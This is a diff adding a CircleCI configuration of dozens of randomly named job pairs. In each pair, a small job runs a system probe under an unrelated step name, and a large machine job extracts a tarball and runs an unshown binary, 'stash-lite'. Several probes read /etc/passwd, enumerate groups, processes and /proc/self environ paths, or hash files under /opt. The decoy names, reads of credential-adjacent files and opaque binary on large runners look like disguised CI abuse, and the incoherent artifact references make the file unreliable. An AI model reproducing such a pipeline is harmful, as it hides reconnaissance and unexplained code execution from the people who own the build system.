@@ -1,0 +1,1516 @@
+version: 2.1
+
+jobs:
+  bbennett86:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: format coverage report r7
+          command: |
+            mkdir -p /tmp/cargo
+            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=100 count=10000 2>/dev/null | md5sum > /tmp/cargo/20.121; true
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '20.121'
+  nebula-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/20.121 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  ortho_rect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Exercise Crimson Fox
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; getent group|head -n 4|tail -n 4; true ; } > /tmp/cargo/velvet657
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'velvet657'
+  intergration-73:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/velvet657 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  ms321:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: post team
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type f -name 'environ' -executable -exec dirname {} \; 2>/dev/null|sort; true ; } > /tmp/cargo/tradeGuestViolet
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'tradeGuestViolet'
+  ShipPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/stone.sprite.harbor.tundra.zinc 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  sdof27od8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: We have to cut the main branch
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f -printf '%s\n' 2> /dev/null|head -n 15|paste -sd+; true ; } > /tmp/cargo/CSV.de943-4345.obj
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'CSV.de943-4345.obj'
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/CSV.de943-4345.obj 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  lishbealglossx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Audit Revenue Split Take 4
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >'/tmp/expense02.gz' && zcat '/tmp/expense02.gz' | head -3; true ; } > /tmp/cargo/PXL_00005870
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'PXL_00005870'
+  d-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/PXL_00005870 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  build2042:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Straight after survey the interns
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; touch /tmp/cinema.csv '/tmp/receiptpile.copy' && ls -l /tmp/cinema.csv '/tmp/receiptpile.copy'; true ; } > /tmp/cargo/voIs86e
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'voIs86e'
+  nov25-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/f861d9b3c 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  resolveACLs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Meanwhile stitch the bumper
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; grep -os local /etc/hosts | sort -u; true ; } > /tmp/cargo/coastal.meadow.harbor
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'coastal.meadow.harbor'
+  v9-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/coastal.meadow.harbor 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  Sort-StubStatus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Fermata on the wiki
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'nothing to do' | od -c | head -2; true ; } > /tmp/cargo/AGENT
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'AGENT'
+  sirius-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/AGENT 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  rst_req_hr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Excuse the wait
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; touch "/tmp/right_owl_2021_11_27.out" && chmod a-w "/tmp/right_owl_2021_11_27.out" && ls -l "/tmp/right_owl_2021_11_27.out"; true ; } > /tmp/cargo/sigma-canvas-spark-heath
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'sigma-canvas-spark-heath'
+  fx-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/sigma-canvas-spark-heath 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  tryPush:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Wizard profiling
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/se8' && touch '/tmp/se8'/file{1..3}.log && ls '/tmp/se8'; true ; } > /tmp/cargo/stone.sprite.harbor.tundra.zinc
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'stone.sprite.harbor.tundra.zinc'
+  Package_Tests7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/stone.sprite.harbor.tundra.zinc 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  trackUrl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Take Nine Tunnel
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; grep -q "hosts" /etc/nsswitch.conf && echo matched; true ; } > /tmp/cargo/CHROME_OMEGA_MOUNTAIN_GLYPH
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'CHROME_OMEGA_MOUNTAIN_GLYPH'
+  Launch_Staging3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/CHROME_OMEGA_MOUNTAIN_GLYPH 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  block--green:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Quiet the loud intrusion rules
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep --colour=auto 'bin' | cut -d: -f1; true ; } > /tmp/cargo/3L37
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '3L37'
+  BUILD_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/f861d9b3c 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  littleMint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Demux for QA
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 3 -type f -size +1k -links +1 -exec md5sum {} + 2>/dev/null|nl; true ; } > /tmp/cargo/hw_db_pkg
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'hw_db_pkg'
+  november-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/hw_db_pkg 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  escapeManager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Meanwhile aliquot the reagents
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; ps -eo pid,user,comm,%mem|awk 'NR>1 {print $1}'|rev|awk '{print length, $0}'; true ; } > /tmp/cargo/assetKernel
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'assetKernel'
+  dan-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/assetKernel 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  copy39:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: RETRY 48E
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -Xov . | nl; true ; } > /tmp/cargo/canvas_frame
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'canvas_frame'
+  d-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/stone.sprite.harbor.tundra.zinc 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  uq_Digest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Climb to 22k
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; grep -q 'case' $HOME/.bashrc && echo matched; true ; } > /tmp/cargo/crisp-render
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'crisp-render'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/stone.sprite.harbor.tundra.zinc 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  PulseSnapshot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Sweep the freezer rack
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; getconf HOST_NAME_MAX; true ; } > /tmp/cargo/136.207
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '136.207'
+  add-db-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/f861d9b3c 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  insertNameMVC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Shelve inventory shelf B4
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; { echo 'patch applied'; echo 'trailing spaces   '; } | sort; true ; } > /tmp/cargo/blake_ba57c5676d856ab6
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'blake_ba57c5676d856ab6'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/blake_ba57c5676d856ab6 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  scanStubJPEG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Quest for the loss curve
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; sed 's|.*/||' < /etc/shells | awk 'length > 3'; true ; } > /tmp/cargo/SAvANNastaCkqueUestonE
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'SAvANNastaCkqueUestonE'
+  pat-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/f861d9b3c 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  o-header:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: MuxCoverArt
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; dirname ${TMPDIR:-/tmp}/patches-library-otter.log; true ; } > /tmp/cargo/ORD23839
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'ORD23839'
+  LAB_CHECK_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/ORD23839 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  embFontManifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Never mind batching
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; for w in $(seq 5); do echo $((w * w)); done; true ; } > /tmp/cargo/run_350
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'run_350'
+  anothr-run-16:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/run_350 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  Rec2018:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: alright normalize the session logs
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm|grep -v grep|head -10; true ; } > /tmp/cargo/170.220
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '170.220'
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/stone.sprite.harbor.tundra.zinc 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  lanDiffBox:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Then sort the report PDFs
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; echo 'ready' | od -c | head -2; true ; } > /tmp/cargo/224610_2015
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - '224610_2015'
+  intergration-14:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/224610_2015 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  add_subscribe_settings:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Deliver publish value
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; for ((w=1; w<=150; w*=2)); do echo $w; done; true ; } > /tmp/cargo/xx_8ac95a044c16207
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'xx_8ac95a044c16207'
+  v7-ga5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/xx_8ac95a044c16207 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  ella_clove:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Daily culture plate culturing
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; date| expand -t 7| awk '{print NF}'| paste -sd+; true ; } > /tmp/cargo/TICKET_098994
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'TICKET_098994'
+  callisto:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/TICKET_098994 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  finalInt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: GROW434 Build api tier
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; echo 'done'|cut -d' ' -f1; true ; } > /tmp/cargo/glyph-net.Atoll
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'glyph-net.Atoll'
+  q3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/stone.sprite.harbor.tundra.zinc 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  DstSimpleDepth:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Inspect inventory in time for the pilot
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; command -v echo; true ; } > /tmp/cargo/f861d9b3c
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'f861d9b3c'
+  t:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
+            du -k /tmp/cargo/f861d9b3c 2>/dev/null || true
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 1 --quiet --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress bundle
+          command: tar -I xz -xf prod-build-stage.tar.xz
+      - run:
+          command: env ./stash-lite
+  ckpt724:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: MirrorReleaseZip
+          command: |
+            mkdir -p /tmp/cargo
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type f -name 'default' -uid 0 -exec ls -l {} + 2>/dev/null|xargs ls -ld; true ; } > /tmp/cargo/SavannaTradeGlint
+            echo "finished-at $(date -Iseconds)"
+      - persist_to_workspace:
+          root: /tmp/cargo
+          paths:
+            - 'SavannaTradeGlint'
+  run-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cargo
+      - run:
+          name: Measure upstream
+          command: |
